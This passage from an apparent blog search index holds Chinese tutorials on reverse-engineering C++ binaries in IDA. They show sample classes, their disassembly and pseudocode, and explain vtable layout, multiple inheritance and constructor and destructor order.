ptr [eax], offset ??_7SofaBed@@6B@_0 ; const SofaBed::`vftable&#x27;.text:00401263                                         ; 设置第一个虚表指针.text:00401269                 mov     ecx, [ebp-10h]  ; 获取对象的首地址.text:0040126C                 mov     dword ptr [ecx+8], offset ??_7SofaBed@@6B@ ; const SofaBed::`vftable&#x27;.text:0040126C                                         ; 设置第二个虚表指针.text:00401273                 mov     edx, [ebp-10h].text:00401276                 mov     dword ptr [edx+14h], 6.text:00401276 ;   &#125; // starts at 40124E.text:0040127D                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:00401284                 mov     eax, dword ptr [ebp+var_10].text:00401287                 mov     ecx, [ebp-0Ch].text:0040128A                 mov     large fs:0, ecx.text:00401291                 pop     ecx.text:00401292                 mov     esp, ebp.text:00401294                 pop     ebp.text:00401295                 retn.text:00401295 ; &#125; // starts at 401220.text:00401295 sub_401220      endp_DWORD *__thiscall sub_401220(_DWORD *this)&#123;  sub_401080(this);  sub_401150(this + 2);  *this = &amp;SofaBed::`vftable&#x27;;  this[2] = &amp;SofaBed::`vftable&#x27;;  this[5] = 6;  return this;&#125;\n\n在上面代码的子类构造中，根据继承关系的顺序，先调用父类Sofa的构造函数。在调用另一个父类Bed时，并不是直接将对象的首地址作为this指针传递，而是向后调整了父类Sofa的长度，以调整后的地址值作为this指针，最后再调用父类Bed的构造函数。\n关于虚表指针因为有了两个父类，所以子类在继承时也将它们的虚表指针一起继承了过来，也就有了两个虚表指针。可见，在多重继承中，子类虚表指针的个数取决于继承的父类的个数，有几个父类便会出现几个虚表指针（虚基类除外）。\n以父类的虚函数为基础，若子类重写了父类的虚函数，则子类的虚函数表中用重写后的虚函数覆盖掉父类被重写的虚函数，若没重写，则保留父类的虚函数，最后再按顺序填写子类自有的虚函数，若有多个父类，则有多个虚函数表，但只在相对于第一个父类（左数第一个）的虚函数表填写子类自有的虚函数，如下例子：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Sofa &#123;public:\tSofa() &#123;\t\tcolor = 2;\t&#125;\tvirtual ~Sofa() &#123; // 沙发类虚析构函数\t\tprintf(&quot;virtual ~Sofa()\\n&quot;);\t&#125;\tvirtual int getColor() &#123; // 获取沙发颜色\t\treturn color;\t&#125;\tvirtual int sitDown() &#123; // 沙发可以坐下休息\t\treturn printf(&quot;Sit down and rest your legs\\r\\n&quot;);\t&#125;protected:\tint color; // 沙发类成员变量&#125;;//定义床类class Bed &#123;public:\tBed() &#123;\t\tlength = 4;\t\twidth = 5;\t&#125;\tvirtual ~Bed() &#123; //床类虚析构函数\t\tprintf(&quot;virtual ~Bed()\\n&quot;);\t&#125;\tvirtual int getArea() &#123; //获取床面积\t\treturn length * width;\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;go to sleep\\r\\n&quot;);\t&#125;protected:\tint length; //床类成员变量\tint width;&#125;;//子类沙发床定义，派生自Sofa类和Bed类class SofaBed : public Sofa, public Bed &#123;public:\tSofaBed() &#123;\t\theight = 6;\t&#125;\tvirtual ~SofaBed() &#123; //沙发床类的虚析构函数\t\tprintf(&quot;virtual ~SofaBed()\\n&quot;);\t&#125;\tvirtual int getShape() &#123;\t\treturn printf(&quot;getShape\\r\\n&quot;);\t&#125;\tvirtual int sitDown() &#123; //沙发可以坐下休息\t\treturn printf(&quot;Sit down on the sofa bed\\r\\n&quot;);\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;go to sleep on the sofa bed\\r\\n&quot;);\t&#125;\tvirtual int getHeight() &#123;\t\treturn height;\t&#125;\tprotected:\tint height;&#125;;int main(int argc, char* argv[]) &#123;\tSofaBed sofabed;\treturn 0;&#125;\n\n上面代码中，子类SofaBed的内存布局如下：\n12345678910111213141516171819202122232425261&gt;class SofaBed\tsize(24):1&gt;\t+---1&gt; 0\t| +--- (base class Sofa)1&gt; 0\t| | &#123;vfptr&#125;1&gt; 4\t| | color1&gt;\t| +---1&gt; 8\t| +--- (base class Bed)1&gt; 8\t| | &#123;vfptr&#125;1&gt;12\t| | length1&gt;16\t| | width1&gt;\t| +---1&gt;20\t| height1&gt;\t+---1&gt;SofaBed::$vftable@Sofa@:1&gt;\t| &amp;SofaBed_meta1&gt;\t|  01&gt; 0\t| &amp;SofaBed::&#123;dtor&#125;1&gt; 1\t| &amp;Sofa::getColor1&gt; 2\t| &amp;SofaBed::sitDown1&gt; 3\t| &amp;SofaBed::getShape1&gt; 4\t| &amp;SofaBed::getHeight1&gt;SofaBed::$vftable@Bed@:1&gt;\t| -81&gt; 0\t| &amp;thunk: this-=8; goto SofaBed::&#123;dtor&#125;1&gt; 1\t| &amp;Bed::getArea1&gt; 2\t| &amp;SofaBed::sleep\n\n\n\n多重继承子类对象转换为父类指针虚表指针在将子类对象转换成父类指针时使用，每个虚表指针对应着一个父类\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Sofa &#123;public:\tSofa() &#123;\t\tcolor = 2;\t&#125;\tvirtual ~Sofa() &#123; // 沙发类虚析构函数\t\tprintf(&quot;virtual ~Sofa()\\n&quot;);\t&#125;\tvirtual int getColor() &#123; // 获取沙发颜色\t\treturn color;\t&#125;\tvirtual int sitDown() &#123; // 沙发可以坐下休息\t\treturn printf(&quot;Sit down and rest your legs\\r\\n&quot;);\t&#125;protected:\tint color; // 沙发类成员变量&#125;;//定义床类class Bed &#123;public:\tBed() &#123;\t\tlength = 4;\t\twidth = 5;\t&#125;\tvirtual ~Bed() &#123; //床类虚析构函数\t\tprintf(&quot;virtual ~Bed()\\n&quot;);\t&#125;\tvirtual int getArea() &#123; //获取床面积\t\treturn length * width;\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;go to sleep\\r\\n&quot;);\t&#125;protected:\tint length; //床类成员变量\tint width;&#125;;//子类沙发床定义，派生自Sofa类和Bed类class SofaBed : public Sofa, public Bed &#123;public:\tSofaBed() &#123;\t\theight = 6;\t&#125;\tvirtual ~SofaBed() &#123; //沙发床类的虚析构函数\t\tprintf(&quot;virtual ~SofaBed()\\n&quot;);\t&#125;\tvirtual int sitDown() &#123; //沙发可以坐下休息\t\treturn printf(&quot;Sit down on the sofa bed\\r\\n&quot;);\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;go to sleep on the sofa bed\\r\\n&quot;);\t&#125;\tvirtual int getHeight() &#123;\t\treturn height;\t&#125;protected:\tint height;&#125;;int main(int argc, char* argv[]) &#123;\tSofaBed sofabed;\tSofa* sofa = &amp;sofabed;\tBed* bed = &amp;sofabed;\treturn 0;&#125;\n\nida汇编及伪代码视图：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758.text:00401370 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401370 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401370.text:00401370 var_2C          = dword ptr -2Ch.text:00401370 var_28          = dword ptr -28h.text:00401370 var_24          = dword ptr -24h.text:00401370 var_20          = dword ptr -20h.text:00401370 var_1C          = byte ptr -1Ch.text:00401370 var_4           = dword ptr -4.text:00401370 argc            = dword ptr  8.text:00401370 argv            = dword ptr  0Ch.text:00401370 envp            = dword ptr  10h.text:00401370.text:00401370                 push    ebp.text:00401371                 mov     ebp, esp.text:00401373                 sub     esp, 2Ch.text:00401376                 mov     eax, ___security_cookie.text:0040137B                 xor     eax, ebp.text:0040137D                 mov     [ebp-4], eax.text:00401380                 lea     ecx, [ebp-1Ch]  ; 传递this指针.text:00401383                 call    sub_401220      ; 调用构造函数.text:00401388                 lea     eax, [ebp-1Ch].text:0040138B                 mov     [ebp-28h], eax  ; 直接以首地址转换为父类指针，sofa=&amp;sofabed.text:0040138E                 lea     ecx, [ebp-1Ch].text:00401391                 test    ecx, ecx.text:00401393                 jz      short loc_4013A0 ; 检查对象首地址.text:00401395                 lea     edx, [ebp-1Ch]  ; edx=this.text:00401398                 add     edx, 8.text:0040139B                 mov     [ebp-20h], edx  ; 即this+8， 调整为Bed的指针，bed=&amp;sofabed.text:0040139E                 jmp     short loc_4013A7.text:004013A0 ; ---------------------------------------------------------------------------.text:004013A0.text:004013A0 loc_4013A0:                             ; CODE XREF: _main+23↑j.text:004013A0                 mov     dword ptr [ebp-20h], 0.text:004013A7.text:004013A7 loc_4013A7:                             ; CODE XREF: _main+2E↑j.text:004013A7                 mov     eax, [ebp-20h].text:004013AA                 mov     [ebp-2Ch], eax.text:004013AD                 mov     dword ptr [ebp-24h], 0.text:004013B4                 lea     ecx, [ebp-1Ch]  ; 传递this指针.text:004013B7                 call    sub_4012A0      ; 调用析构函数.text:004013BC                 mov     eax, [ebp-24h].text:004013BF                 mov     ecx, [ebp-4].text:004013C2                 xor     ecx, ebp        ; StackCookie.text:004013C4                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004013C9                 mov     esp, ebp.text:004013CB                 pop     ebp.text:004013CC                 retn.text:004013CC _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4; // [esp+10h] [ebp-1Ch] BYREF  sub_401220();  sub_4012A0((char)&amp;v4);  return 0;&#125;\n\n在上面的代码中，在转换Bed指针时，会调整首地址并跳过第一个父类占用的空间。这样一来，当使用父类Bed的指针访问Bed中实现的虚函数时，就不会错误地寻址到继承自Sofa类的成员变量了。\n多重继承的类对象析构函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Sofa &#123;public:\tSofa() &#123;\t\tcolor = 2;\t&#125;\tvirtual ~Sofa() &#123; // 沙发类虚析构函数\t\tprintf(&quot;virtual ~Sofa()\\n&quot;);\t&#125;\tvirtual int getColor() &#123; // 获取沙发颜色\t\treturn color;\t&#125;\tvirtual int sitDown() &#123; // 沙发可以坐下休息\t\treturn printf(&quot;Sit down and rest your legs\\r\\n&quot;);\t&#125;protected:\tint color; // 沙发类成员变量&#125;;//定义床类class Bed &#123;public:\tBed() &#123;\t\tlength = 4;\t\twidth = 5;\t&#125;\tvirtual ~Bed() &#123; //床类虚析构函数\t\tprintf(&quot;virtual ~Bed()\\n&quot;);\t&#125;\tvirtual int getArea() &#123; //获取床面积\t\treturn length * width;\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;go to sleep\\r\\n&quot;);\t&#125;protected:\tint length; //床类成员变量\tint width;&#125;;//子类沙发床定义，派生自Sofa类和Bed类class SofaBed : public Sofa, public Bed &#123;public:\tSofaBed() &#123;\t\theight = 6;\t&#125;\tvirtual ~SofaBed() &#123; //沙发床类的虚析构函数\t\tprintf(&quot;virtual ~SofaBed()\\n&quot;);\t&#125;\tvirtual int sitDown() &#123; //沙发可以坐下休息\t\treturn printf(&quot;Sit down on the sofa bed\\r\\n&quot;);\t&#125;\tvirtual int sleep() &#123; //床可以用来睡觉\t\treturn printf(&quot;go to sleep on the sofa bed\\r\\n&quot;);\t&#125;\tvirtual int getHeight() &#123;\t\treturn height;\t&#125;protected:\tint height;&#125;;int main(int argc, char* argv[]) &#123;\tSofaBed sofabed;\tSofa* sofa = &amp;sofabed;\tBed* bed = &amp;sofabed;\treturn 0;&#125;\n\n析构函数IDA汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839.text:004012A0 ; int __fastcall sub_4012A0(_DWORD *).text:004012A0 sub_4012A0      proc near               ; CODE XREF: sub_401340+A↓p.text:004012A0                                         ; _main+47↓p.text:004012A0.text:004012A0 var_4           = byte ptr -4.text:004012A0.text:004012A0                 push    ebp             ; 析构函数.text:004012A1                 mov     ebp, esp.text:004012A3                 push    ecx             ; char.text:004012A4                 mov     [ebp-4], ecx.text:004012A7                 mov     eax, [ebp-4].text:004012AA                 mov     dword ptr [eax], offset ??_7SofaBed@@6B@_0 ; const SofaBed::`vftable&#x27;.text:004012AA                                         ; 将第一个虚表设置为SofaBed的虚表.text:004012B0                 mov     ecx, [ebp-4].text:004012B3                 mov     dword ptr [ecx+8], offset ??_7SofaBed@@6B@ ; const SofaBed::`vftable&#x27;.text:004012B3                                         ; 将第二个虚表设置为SofaBed的虚表.text:004012BA                 push    offset aVirtualSofabed ; &quot;virtual ~SofaBed()\\n&quot;.text:004012BF                 call    printf.text:004012C4                 add     esp, 4.text:004012C7                 mov     ecx, [ebp-4].text:004012CA                 add     ecx, 8          ; 调整this指针到Bed父类，this+8.text:004012CD                 call    sub_401180      ; 调用父类Bed的析构函数.text:004012D2                 mov     ecx, [ebp-4]    ; this指针，无需调整.text:004012D5                 call    sub_4010B0      ; 调用父类Sofa的析构函数.text:004012DA                 mov     esp, ebp.text:004012DC                 pop     ebp.text:004012DD                 retn.text:004012DD sub_4012A0      endpint __fastcall sub_4012A0(_DWORD *a1)&#123;  char v2; // [esp+0h] [ebp-4h]  *a1 = &amp;SofaBed::`vftable&#x27;;  a1[2] = &amp;SofaBed::`vftable&#x27;;  printf(&quot;virtual ~SofaBed()\\n&quot;, (char)a1);  sub_401180(v2 + 8);  return sub_4010B0(v2);&#125;\n\n上面代码演示了对象SofaBed的析构过程。因为具有多个同级父类（多个同时继承的父类），所以在子类中产生了多个虚表指针。在对父类进行析构时，需要设置this指针，用于调用父类的析构函数。因为具有多个父类，所以在析构的过程中调用各个父类的析构函数时，传递的首地址将有所不同，编译器会根据每个父类在对象中占用的空间位置，相应地传入各个父类部分的首地址作为this指针。\n单继承类与多重继承类的特征前面讲解了多重继承中子类对象的生成与销毁过程以及在内存中的分布情况，对比单继承类，两者特征总结如下:\n1. 单继承类\n在类对象占用的内存空间中，只保存一份虚表指针。\n\n因为只有一个虚表指针，所以只有一个虚表。\n\n虚表中各项保存了类中各虚函数的首地址。\n\n构造时先构造父类，再构造自身，并且只调用一次父类构造函数。\n\n析构时先析构自身，再析构父类，并且只调用一次父类析构函数。\n\n\n2. 多重继承类\n在类对象占用内存空间中，根据继承父类（有虚函数）个数保存对应的虚表指针。\n\n根据保存的虚表指针的个数，产生相应个数的虚表。\n\n转换父类指针时，需要调整到对象的首地址。\n\n构造时需要调用多个父类构造函数。\n\n构造时先构造继承列表中的第一个父类，然后依次调用到最后一个继承的父类构造函数。\n\n析构时先析构自身，然后以构造函数相反的顺序调用所有父类的析构函数。\n\n\n当对象作为成员时，整个类对象的内存结构和多重继承相似。当类中无虚函数时，整个类对象内存结构和多重继承完全一样，可酌情还原。当父类或成员对象存在虚函数，通过观察虚表指针的位置和构造、析构函数中填写虚表指针的数目、顺序及目标地址，还原继承或成员关系。\n在对象模型的还原过程中，可根据以上特性识别继承关系。对于有虚函数的情况，可利用虚表的初始化，使用IDA中的引用参考进行识别还原。\n","slug":"C++逆向——多重继承","date":"2023-02-17T07:22:42.000Z","categories_index":"","tags_index":"c++逆向","author_index":"0netry"},{"id":"d75c57bec22710c7148f63c849522585","title":"C++逆向——识别类和类之间的关系","content":"在C++的继承关系中，子类具备父类所有成员数据和成员函数。子 类 对 象 可 以 直 接 使 用 父 类 中 声 明 为 公 有 （ public ） 和 保 护（protected）的数据成员与成员函数。对于在父类中声明为私有（private）的成员，虽然子类对象无法直接访问，但是在子类对象的内存结构中，父类私有的成员数据依然存在。C++语法规定的访问控制仅限于编译层面，在编译的过程中由编译器进行语法检查，因此访问控制不会影响对象的内存结构。\n定义基类和派生类12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Base &#123; //基类定义public:\tBase() &#123;\t\tprintf(&quot;Base\\n&quot;);\t&#125;\t~Base() &#123;\t\tprintf(&quot;~Base\\n&quot;);\t&#125;\tvoid setNumber(int n) &#123;\t\tbase = n;\t&#125;\tint getNumber() &#123;\t\treturn base;\t&#125;public:\tint base;&#125;;class Derive : public Base &#123; //派生类定义public:\tvoid showNumber(int n) &#123;\t\tsetNumber(n);\t\tderive = n + 1;\t\tprintf(&quot;%d\\n&quot;, getNumber());\t\tprintf(&quot;%d\\n&quot;, derive);\t&#125;public:\tint derive;&#125;;int main(int argc, char* argv[]) &#123;\tDerive derive;\tderive.showNumber(argc);\treturn 0;&#125;\n\n上面代码中定义了两个具有继承关系的类。父类Base中定义了数据成员base、构造函数、析构函数和两个成员函数。子类中只有一个成员函数showNumber和一个数据成员derive。根据C++的语法规则，子类Derive将继承父类中的成员数据和成员函数。那么，当申请子类对象Derive时，它在内存中如何存储，又如何使用父类成员函数呢？\n分析其汇编查看其内存结构及程序执行流程，汇编如下：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165//main函数.text:00401140 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401140 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401140.text:00401140 var_1C          = dword ptr -1Ch.text:00401140 var_18          = byte ptr -18h.text:00401140 var_10          = dword ptr -10h.text:00401140 var_C           = dword ptr -0Ch.text:00401140 var_4           = dword ptr -4.text:00401140 argc            = dword ptr  8.text:00401140 argv            = dword ptr  0Ch.text:00401140 envp            = dword ptr  10h.text:00401140.text:00401140 ; FUNCTION CHUNK AT .text:00401E80 SIZE 00000008 BYTES.text:00401140 ; FUNCTION CHUNK AT .text:00401E8D SIZE 00000027 BYTES.text:00401140.text:00401140 ; __unwind &#123; // _main_SEH.text:00401140                 push    ebp.text:00401141                 mov     ebp, esp.text:00401143                 push    0FFFFFFFFh.text:00401145                 push    offset _main_SEH.text:0040114A                 mov     eax, large fs:0.text:00401150                 push    eax.text:00401151                 sub     esp, 10h.text:00401154                 mov     eax, ___security_cookie.text:00401159                 xor     eax, ebp.text:0040115B                 mov     [ebp-10h], eax.text:0040115E                 push    eax.text:0040115F                 lea     eax, [ebp-0Ch].text:00401162                 mov     large fs:0, eax.text:00401168                 lea     ecx, [ebp-18h]  ; 获取对象首地址作为this指针.text:0040116B                 call    sub_4011C0      ; 调用类Derive的构造函数，编译器为Derive提供了默认的构造函数.text:00401170 ;   try &#123;.text:00401170                 mov     dword ptr [ebp-4], 0.text:00401177                 mov     eax, [ebp+8].text:0040117A                 push    eax             ; 参数2：argc.text:0040117B                 lea     ecx, [ebp-18h]  ; 参数1：传入this指针.text:0040117E                 call    sub_4010F0      ; 调用成员函数showNumber.text:00401183                 mov     dword ptr [ebp-1Ch], 0.text:00401183 ;   &#125; // starts at 401170.text:0040118A                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:00401191                 lea     ecx, [ebp-18h]  ; 传入this指针.text:00401194                 call    sub_4011E0      ; 调用类Derive的析构函数，编译器为Derive提供了默认的析构函数.text:00401199                 mov     eax, [ebp-1Ch].text:0040119C                 mov     ecx, [ebp-0Ch].text:0040119F                 mov     large fs:0, ecx.text:004011A6                 pop     ecx.text:004011A7                 mov     ecx, [ebp-10h].text:004011AA                 xor     ecx, ebp        ; StackCookie.text:004011AC                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004011B1                 mov     esp, ebp.text:004011B3                 pop     ebp.text:004011B4                 retn.text:004011B4 ; &#125; // starts at 401140.text:004011B4 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[8]; // [esp+8h] [ebp-18h] BYREF  int v5; // [esp+1Ch] [ebp-4h]  sub_4011C0(v4);  v5 = 0;  sub_4010F0(argc);  v5 = -1;  sub_4011E0(v4);  return 0;&#125;//子类Derive的默认构造函数分析.text:004011C0 ; void *__thiscall sub_4011C0(void *this).text:004011C0 sub_4011C0      proc near               ; CODE XREF: _main+2B↑p.text:004011C0.text:004011C0 var_4           = byte ptr -4.text:004011C0.text:004011C0                 push    ebp             ; 子类Derive的默认构造函数分析.text:004011C1                 mov     ebp, esp.text:004011C3                 push    ecx.text:004011C4                 mov     [ebp-4], ecx.text:004011C7                 mov     ecx, [ebp-4]    ; 以子类对象首地址作为父类的this指针.text:004011CA                 call    sub_401080      ; 调用父类构造函数.text:004011CF                 mov     eax, [ebp-4].text:004011D2                 mov     esp, ebp.text:004011D4                 pop     ebp.text:004011D5                 retn.text:004011D5 sub_4011C0      endpvoid *__thiscall sub_4011C0(void *this)&#123;  sub_401080((char)this);  return this;&#125;//父类构造函数.text:00401080 ; int __fastcall sub_401080(char).text:00401080 sub_401080      proc near               ; CODE XREF: sub_4011C0+A↓p.text:00401080.text:00401080 var_4           = dword ptr -4.text:00401080.text:00401080                 push    ebp             ; 父类构造函数.text:00401081                 mov     ebp, esp.text:00401083                 push    ecx             ; char.text:00401084                 mov     [ebp+var_4], ecx.text:00401087                 push    offset Format   ; &quot;Base\\n&quot;.text:0040108C                 call    printf.text:00401091                 add     esp, 4.text:00401094                 mov     eax, [ebp+var_4].text:00401097                 mov     esp, ebp.text:00401099                 pop     ebp.text:0040109A                 retn.text:0040109A sub_401080      endpint __fastcall sub_401080(char a1)&#123;  int v2; // [esp+0h] [ebp-4h]  printf(&quot;Base\\n&quot;, a1);  return v2;&#125;//子类Derive的默认析构函数分析.text:004011E0 ; int __fastcall sub_4011E0(char).text:004011E0 sub_4011E0      proc near               ; CODE XREF: _main+54↑p.text:004011E0                                         ; _main+D43↓j.text:004011E0.text:004011E0 var_4           = byte ptr -4.text:004011E0.text:004011E0                 push    ebp             ; 子类Derive的默认析构函数分析.text:004011E1                 mov     ebp, esp.text:004011E3                 push    ecx.text:004011E4                 mov     [ebp-4], ecx.text:004011E7                 mov     ecx, [ebp-4]    ; 以子类对象首地址作为父类的this指针.text:004011EA                 call    sub_4010A0      ; 调用父类析构函数.text:004011EF                 mov     esp, ebp.text:004011F1                 pop     ebp.text:004011F2                 retn.text:004011F2 sub_4011E0      endpint __fastcall sub_4011E0(char a1)&#123;  return sub_4010A0(a1);&#125;//父类析构函数.text:004010A0 ; int sub_4010A0().text:004010A0 sub_4010A0      proc near               ; CODE XREF: sub_4011E0+A↓p.text:004010A0.text:004010A0 var_4           = dword ptr -4.text:004010A0.text:004010A0                 push    ebp             ; 父类析构函数.text:004010A1                 mov     ebp, esp.text:004010A3                 push    ecx             ; char.text:004010A4                 mov     [ebp+var_4], ecx.text:004010A7                 push    offset aBase_0  ; &quot;~Base\\n&quot;.text:004010AC                 call    printf.text:004010B1                 add     esp, 4.text:004010B4                 mov     esp, ebp.text:004010B6                 pop     ebp.text:004010B7                 retn.text:004010B7 sub_4010A0      endpint sub_4010A0()&#123;  return printf(&quot;~Base\\n&quot;);&#125;\n\n对上面代码进行分析后发现，编译器提供了默认构造函数与析构函数。当子类中没有构造函数或析构函数，父类却需要构造函数和析构函数时，编译器会为子类提供默认的构造函数与析构函数。\n由于子类继承了父类，因此子类中需要拥有父类的各成员，类似在子类中定义了父类的对象作为数据成员使用。\n上面代码中的类关系如果转换成以下代码，它们的内存结构是等价的。\n123456789class Base&#123;...&#125;; //类定义见代码清单12-1class Derive &#123;public:Base base; //原来的父类Base 成为成员对象int derive; // 原来的子类派生数据&#125;;\n\n原来的父类Base成为Derive的一个成员对象，当产生Derive类的对象时，会先产生成员对象base，这需要调用其构造函数。当Derive类没有构造函数时，为了能够在Derive类对象产生时调用成员对象的构造函数，编译器同样会提供默认的构造函数，以实现成员构造函数的调用。\n但是，如果子类含有构造函数，而父类不存在构造函数，则编译器不会为父类提供默认的构造函数。在构造子类时，因为父类中没有虚表指针，也不存在构造祖先类的问题，所以添加默认构造函数对父类没有任何意义。父类中含有虚函数的情况则不同，此时父类需要初始化虚表工作，因此编译器会为其提供默认的构造函数，以初始化虚表指针。\n当子类对象被销毁时，其父类也同时被销毁，为了可以调用父类的析构函数，编译器为子类提供了默认的析构函数。在子类的析构函数中，析构函数的调用顺序与构造函数相反，先执行自身的析构代码，再执行父类的析构代码。\n依照构造函数与析构函数的调用顺序，不仅可以顺藤摸瓜找出各类之间的关系，还可以区别出构造函数与析构函数。\n类的构造顺序子类对象在内存中的数据排列：先安排父类的数据，后安排子类新定义的数据。当类中定义了其他对象作为成员，并在初始化列表中指定了某个成员的初始化值时，构造的顺序会是怎样的呢？我们先来看下面的代码。\n1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Base &#123; //基类定义public:\tBase() &#123;\t\tprintf(&quot;Base\\n&quot;);\t&#125;\t~Base() &#123;\t\tprintf(&quot;~Base\\n&quot;);\t&#125;\tvoid setNumber(int n) &#123;\t\tbase = n;\t&#125;\tint getNumber() &#123;\t\treturn base;\t&#125;public:\tint base;&#125;;class Member &#123;public:\tMember() &#123;\t\tmember = 0;\t&#125;\tint member;&#125;;class Derive : public Base &#123;public:\tDerive() :derive(1) &#123;\t\tprintf(&quot;使用初始化列表\\n&quot;);\t&#125;public:\tMember member; //类中定义其他对象作为成员\tint derive;&#125;;int main(int argc, char* argv[]) &#123;\tDerive derive;\treturn 0;&#125;\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101//main函数.text:00401150 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401150 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401150.text:00401150 var_14          = dword ptr -14h.text:00401150 var_10          = byte ptr -10h.text:00401150 var_4           = dword ptr -4.text:00401150 argc            = dword ptr  8.text:00401150 argv            = dword ptr  0Ch.text:00401150 envp            = dword ptr  10h.text:00401150.text:00401150                 push    ebp.text:00401151                 mov     ebp, esp.text:00401153                 sub     esp, 14h.text:00401156                 mov     eax, ___security_cookie.text:0040115B                 xor     eax, ebp.text:0040115D                 mov     [ebp-4], eax.text:00401160                 lea     ecx, [ebp-10h]  ; 传递this指针.text:00401163                 call    sub_4010E0      ; 调用Derive的构造函数.text:00401168                 mov     dword ptr [ebp-14h], 0.text:0040116F                 lea     ecx, [ebp-10h]  ; 传递this指针.text:00401172                 call    sub_401190      ; 调用Derive的析构函数.text:00401177                 mov     eax, [ebp-14h].text:0040117A                 mov     ecx, [ebp-4].text:0040117D                 xor     ecx, ebp        ; StackCookie.text:0040117F                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:00401184                 mov     esp, ebp.text:00401186                 pop     ebp.text:00401187                 retn.text:00401187 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[12]; // [esp+4h] [ebp-10h] BYREF  sub_4010E0();  sub_401190(v4);  return 0;&#125;//Derive的构造函数.text:004010E0 ; _DWORD *__thiscall sub_4010E0(_DWORD *this).text:004010E0 sub_4010E0      proc near               ; CODE XREF: _main+13↓p.text:004010E0.text:004010E0 var_10          = byte ptr -10h.text:004010E0 var_C           = dword ptr -0Ch.text:004010E0 var_4           = dword ptr -4.text:004010E0 arg_4           = dword ptr  0Ch.text:004010E0.text:004010E0 ; FUNCTION CHUNK AT .text:00401E30 SIZE 00000008 BYTES.text:004010E0 ; FUNCTION CHUNK AT .text:00401E3D SIZE 0000001D BYTES.text:004010E0.text:004010E0 ; __unwind &#123; // SEH_4010E0.text:004010E0                 push    ebp             ; Derive构造函数.text:004010E1                 mov     ebp, esp.text:004010E3                 push    0FFFFFFFFh.text:004010E5                 push    offset SEH_4010E0.text:004010EA                 mov     eax, large fs:0.text:004010F0                 push    eax.text:004010F1                 push    ecx.text:004010F2                 mov     eax, ___security_cookie.text:004010F7                 xor     eax, ebp.text:004010F9                 push    eax             ; char.text:004010FA                 lea     eax, [ebp-0Ch].text:004010FD                 mov     large fs:0, eax.text:00401103                 mov     [ebp-10h], ecx  ; [ebp-10h]保存了this指针.text:00401106                 mov     ecx, [ebp-10h]  ; 传递this指针.text:00401109                 call    sub_401080      ; 调用父类构造函数.text:0040110E ;   try &#123;.text:0040110E                 mov     dword ptr [ebp-4], 0.text:00401115                 mov     ecx, [ebp-10h].text:00401118                 add     ecx, 4          ; 根据this指针调整到类中定义的对象member的首地址处.text:0040111B                 call    unknown_libname_1 ; 调用Member构造函数.text:00401120                 mov     eax, [ebp-10h].text:00401123                 mov     dword ptr [eax+8], 1 ; 执行初始化列表，this指针传递给eax后，[eax+8]是对成员数据derive进行寻址.text:0040112A                 push    offset asc_402110 ; &quot;使用初始化列表\\n&quot;.text:0040112A                                         ; 最后才是执行Derive的构造代码.text:0040112F                 call    printf.text:00401134                 add     esp, 4.text:00401134 ;   &#125; // starts at 40110E.text:00401137                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:0040113E                 mov     eax, [ebp-10h].text:00401141                 mov     ecx, [ebp-0Ch].text:00401144                 mov     large fs:0, ecx.text:0040114B                 pop     ecx.text:0040114C                 mov     esp, ebp.text:0040114E                 pop     ebp.text:0040114F                 retn.text:0040114F ; &#125; // starts at 4010E0.text:0040114F sub_4010E0      endp_DWORD *__thiscall sub_4010E0(_DWORD *this)&#123;  char v2; // [esp+0h] [ebp-14h]  sub_401080((char)this);  unknown_libname_1(this + 1);  this[2] = 1;  printf(&quot;使用初始化列表\\n&quot;, v2);  return this;&#125;\n\n根据以上分析，在有初始化列表的情况下，会优先执行初始化列表中的操作，其次才是自身的构造函数。构造的顺序：先构造父类，然后按声明顺序构造成员对象和初始化列表中指定的成员，最后才是自身的构造代码。读者可自行修改类中各个成员的定义顺序，初始化列表的内容，然后按以上方法分析并验证构造的顺序。\n子类的内存布局12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include 